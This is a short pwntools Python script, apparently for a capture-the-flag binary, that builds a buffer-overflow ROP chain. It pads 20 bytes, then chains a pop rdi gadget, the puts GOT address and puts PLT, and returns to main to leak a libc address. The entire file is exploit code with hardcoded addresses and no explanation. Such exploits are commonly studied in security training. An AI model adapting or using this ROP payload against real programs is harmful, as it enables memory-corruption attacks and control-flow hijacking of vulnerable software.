from pwn import *

offset = 20

puts_plt = 0x400660
puts_got = 0x601018
main_plt = 0x400846
pop_rdi = 0x4009f3

once = 0x601099
gets_plt = 0x4006b0


payload = ""
payload += "A"*offset
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main_plt)

print(payload)
